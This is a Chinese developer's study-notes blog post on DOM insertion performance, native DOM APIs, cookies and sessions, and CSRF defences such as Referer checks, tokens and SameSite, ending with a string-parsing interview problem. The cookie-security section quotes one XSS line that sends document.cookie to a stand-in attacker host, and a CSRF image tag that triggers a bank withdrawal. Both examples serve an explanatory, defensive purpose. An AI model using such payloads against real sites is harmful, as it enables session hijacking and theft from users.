---
title: 日常-2020.3.24
date: 2020-03-24 09:52:01
categories: 日常
---

* 如何给一个页面添加10000个div
* 原生js中常用的操作DOM的api接口
* 不同源就不能传送cooike了吗
* cooike存在的安全隐患
* CSRF解决办法
* 一道处理字符串的代码题

<!--more-->

```html
<!DOCTYPE html>
<html lang="zh-cn">
<head>
    <meta charset="UTF-8">
    <title>Title</title>
    <style>
        body div {
            width: 30px;
            height: 2px;
            border: 1px solid #ee3333;
        }
    </style>
</head>
<body>


<script>
    // 利用 innerHTML 拼接字符串的方式     (添加10000个div)  (耗时约900ms） 最慢
    // function f() {
    //     var date = +new Date();
    //     for (var i = 1; i <= 10000; i++) {
    //         document.body.innerHTML += "<div></div>"
    //     }
    //     var date1 = +new Date();
    //     console.log(date1-date);
    // }
    // f();

    // 利用 innerHTML 数组赋值的方式  结构稍微复杂  （添加10000个div)   （耗时约15ms)  最快
    function f() {
        var date = +new Date();
        var str = [];
        for (var i = 1; i <= 10000; i++) {
            str.push('<div></div>');
        }
        str = str.join('');
        document.body.innerHTML = str;
        var date1 = +new Date();
        console.log(date1 - date);
    }

    f();

    // 利用 createElement    结构清晰简单          (添加10000个div)   (耗时约20ms) 比最快慢一丢丢
    // function f() {
    //     var date = +new Date();
    //     for (var i = 1; i <= 10000; i++) {
    //         var div = document.createElement('div');
    //         document.body.appendChild(div);
    //     }
    //     var date1 = +new Date();
    //     console.log(date1 - date);
    // }
    // f();

</script>
</body>
</html>
```

## 2. 原生JS操作DOM的API

#### 一 、创建型API总结

创建型API包括createElement,createTextNode,cloneNode和createDocumentFragment四个方法，需要注意下面几点:
 (1) 它们创建的节点，只是一个孤立的节点，需要通过appendChild添加到文档中。
 (2) cloneNode要注意，如果被复制，是否包含子节点以及事件绑定等问题。
 (3) 使用createDocumentFragment来解决添加大量节点时的性能问题  。

------

#### 二、 页面修改型API总结

修改页面内容的API主要包括：appendChild,removeChild,insertBefore,replaceChild
 需要注意几点：
 (1) 不管是新增还是替换节点，如果新增或者替换的节点原本是存在于页面上的，则其原来位置的节点将被移除，也就是说同一个节点，不能存在于页面上的多个位置。
 (2) 节点本身绑定的事件不会消失，会一直保留。

------

#### 三、 节点查询型API总结

document.getElementById
 document.getElementByName
 document.getElementByTagName
 document.getElementByClassName
 document.querySelector和document.querySelectorAll：通过CSS选择器来查找元素，注意选择器要复合CSS选择器的规则。使用深度优先搜索来获取元素。

------

#### 四、节点关系型API总结

1. 父关系型API

- parentNode: Element的父节点可能是Element,Document和DocumentFragment
- parentElement:与parentNode的区别在于，其父节点必须是一个Element，如果不是，则返回null。

1. 兄弟关系型API

- previousSibling: 节点的前一个节点，如果该节点是第一个节点，则为null.注意有可能拿到的节点是文本节点或注释节点，与预期的不符，要进行处理一下。
- previousElementSibling:返回前一个元素节点，前一个节点必须是Element,注意IE9以下浏览器不支持。
- nextSibling: 节点的后一个节点，如果该节点是最后一个节点，则为null. 注意有可能拿到的节点是文本节点，与预期的不符，要进行处理一下。
- nextElementSibling: 返回后一个元素节点，后一个节点必须是Element，注意IE9以下浏览器不支持。

1. 子关系型API

- childNodes :返回一个即时的nodeList,表示元素的子节点列表，子节点可能会包含文本节点，注释节点等。
- children: 一个即时的HTMLCollection,子节点都是Element，IE9以下浏览器不支持。
- firstNode: 第一个子节点
- lastNode: 最后一个子节点
- hasChildNodes方法：可以用来判断是否包含子节点

------

#### 五、元素属性型API

setAttribute: 根据名称和值修改元素的特性，eg:element.setAttribute(name,value);
 getAttribute: 返回指定的特性名相应的特性值，如果不存在，则返回null或空字符串。

#### 六、元素样式型API

window.getComutedStyle是用来获取应用到元素后的样式，假设某个元素并未设置高度，而是通过其内容将其高度撑开，这时候要获取它的高度，就要用到getComutedStyle，用法如下：

```
var style = window.getComputedStyle(element[, pseudoElt]);
```

element是要获取的元素，pseudoElt指定一个伪元素进行匹配。
 返回的style是一个CSSStyleDeclaration对象。
 通过style可以访问到元素计算后的样式
 clientRect是一个DOMRect对象，包含left，top，right，bottom，它是相对于可视窗口的距离，滚动位置发生改变时，它们的值是会发生变化的。除了IE9以下浏览器，还包含元素的height和width等数据；

## 3. 不同源就不能传送cookie了吗

没错，cooike不可以跨域。下图为cookie的原理图

 ![1](https://mmbiz.qpic.cn/mmbiz_png/lbvmSLlcGOicIHvCd7lAde60gAEyrzKkoia1iboy4CibSwZPdJ4vIicaMDfn9DBdicUgPViaKIjgURGqP1brnDVywuwgg/640?wx_fmt=png)

用户在输入用户名和密码之后，浏览器将用户名和密码发送给服务器，服务器进行验证，验证通过之后将用户信息加密后封装成**Cookie放在请求头中返回给浏览器**。 

```
HTTP/1.1 200 OK
Content-type: text/html
Set-Cookie: user_cookie=Rg3vHJZnehYLjVg7qi3bZjzg; Expires=Tue, 15 Aug 2019 21:47:38 GMT; Path=/; Domain=.169it.com; HttpOnly

[响应体]

//顶级域名只能设置或访问顶级域名的Cookie，二级及以下的域名只能访问或设置自身或者顶级域名的Cookie
```

浏览器收到服务器返回数据，发现请求头中有一个：**Set-Cookie**，然后它就把这个Cookie保存起来，下次浏览器再请求服务器的时候，会把Cookie也放在**请求头**中传给服务器： 

```
GET /sample_page.html HTTP/1.1
Host: www.example.org
Cookie: user_cookie=Rg3vHJZnehYLjVg7qi3bZjzg
```

### 什么是Session

Session工作原理：

1. 当一个用户向服务器发送第一个请求时，服务器为其建立一个session，并为此session创建一个标识号（sessionID）。
2. 这个用户随后的所有请求都应包括这个标识号（sessionID）。服务器会校对这个标识号以判断请求属于哪个session。

对于session标识号（sessionID），有两种方式实现：Cookie和URL重写，猪哥就以Cookie的实现方式画一个Session原理图。

![2](https://mmbiz.qpic.cn/mmbiz_png/lbvmSLlcGOicIHvCd7lAde60gAEyrzKkoenficyGn5bX7D5CTWf44q8L0iaicCkYMpe4dCGSibbukrf4uQ52aedRSicw/640?wx_fmt=png)

### Cookie和Session关系

1. 都是为了实现客户端与服务端交互而产出
2. Cookie是保存在客户端，缺点易伪造、不安全
3. Session是保存在服务端，会消耗服务器资源
4. Session实现有两种方式：Cookie和URL重写

### Cookie带来的安全性问题

1. **会话劫持和XSS**：在Web应用中，Cookie常用来标记用户或授权会话。因此，如果Web应用的Cookie被窃取，可能导致授权用户的会话受到攻击。常用的窃取Cookie的方法有利用社会工程学攻击和利用应用程序漏洞进行XSS攻击。`(new Image()).src = "http://www.evil-domain.com/steal-cookie.php?cookie=" + document.cookie;`HttpOnly类型的Cookie由于阻止了JavaScript对其的访问性而能在一定程度上缓解此类攻击。
2. **跨站请求伪造（CSRF）**：维基百科已经给了一个比较好的CSRF例子。比如在不安全聊天室或论坛上的一张图片，它实际上是一个给你银行服务器发送提现的请求：`<img src="http://bank.example.com/withdraw?account=bob&amount=1000000&for=mallory">`当你打开含有了这张图片的HTML页面时，如果你之前已经登录了你的银行帐号并且Cookie仍然有效（还没有其它验证步骤），你银行里的钱很可能会被自动转走。**解决CSRF的办法有：隐藏域验证码、确认机制、较短的Cookie生命周期等**

 ### 如何防御

**（1）验证 HTTP Referer 字段** 

 根据 HTTP 协议，在 HTTP 头中有一个字段叫 Referer，它记录了该 HTTP 请求的来源地址。 

如果黑客要对银行网站实施 CSRF 攻击，他只能在他自己的网站构造请求，当用户通过黑客的网站发送请求到银行时，该请求的 Referer 是指向黑客自己的网站。因此，要防御 CSRF 攻击，银行网站只需要对于每一个转账请求验证其 Referer 值 。

然而，这种方法并非万无一失。Referer 的值是由浏览器提供的 ，目前已经有一些方法可以篡改 Referer 值 。

即便是使用最新的浏览器，黑客无法篡改 Referer 值，这种方法仍然有问题。因为 Referer 值会记录下用户的访问来源，有些用户认为这样会侵犯到他们自己的隐私权，因此，用户自己可以设置浏览器使其在发送请求时不再提供 Referer。当他们正常访问银行网站时，网站会因为请求没有 Referer 值而认为是 CSRF 攻击，拒绝合法用户的访问。 

**（2）在请求地址中添加 token 并验证** 

CSRF 攻击之所以能够成功，是因为黑客可以完全伪造用户的请求，该请求中所有的用户验证信息都是存在于 cookie 中，因此黑客可以在不知道这些验证信息的情况下直接利用用户自己的 cookie 来通过安全验证。要抵御 CSRF，关键在于在请求中放入黑客所不能伪造的信息，并且该信息不存在于 cookie 之中。可以在 HTTP 请求中以参数的形式加入一个随机产生的 token，并在服务器端建立一个拦截器来验证这个 token，如果请求中没有 token 或者 token 内容不正确，则认为可能是 CSRF 攻击而拒绝该请求。 

这种方法要比检查 Referer 要安全一些，token 可以在用户登陆后产生并放于 session 之中，然后在每次请求时把 token 从 session 中拿出，与请求中的 token 进行比对，但这种方法的难点在于如何把 token 以参数的形式加入请求。 在一个网站中，可以接受请求的地方非常多，要对于每一个请求都加上 token 是很麻烦的。

**（3）SameSite Cookie**

Set-Cookie 响应头新增 SameSite 属性，它用来标明这个 cookie 是个“同站 cookie”，同站 cookie 只能作为第一方 cookie，不能作为第三方 cookie。SameSite 有两个属性值，分别是 Strict 和 Lax

 `Strict`最为严格，完全禁止第三方 Cookie，跨站点时，任何情况下都不会发送 Cookie。换言之，只有当前网页的 URL 与请求目标一致，才会带上 Cookie。 

`Lax`规则稍稍放宽，大多数情况也是不发送第三方 Cookie，但是导航到目标网址的 Get 请求除外。 

 ## 4. 一道处理字符串的代码题

```js
		//美团一道题
        let str = "x=1&&y=2&&y=3&&z=4&&y=4"

        //输出
        // obj = {
        //     x:1,
        //     y:[2,3],
        //     z:4
        // }

        let tmp = str.split("&&")
        let left = []
        let right = []
        for(let i in tmp){
            left.push(tmp[i].split("=")[0])
            right.push(tmp[i].split("=")[1])
        }
        console.log(left,right)
        let res = new Object()
        for(let i in left){
            if(res.hasOwnProperty(left[i])){//如果包含重复元素
                if(Array.isArray(res[left[i]])){//如果已经是数组就直接添加
                    res[left[i]].push(right[i])
                }else{//如果不是数组则构造成数组
                    let tmp = new Array(res[left[i]])
                    tmp.push(right[i])   //push的返回值为push的值
                    res[left[i]] = tmp
                }    
            }else{
                res[left[i]] = right[i]
            }   
        }
```



 

 

  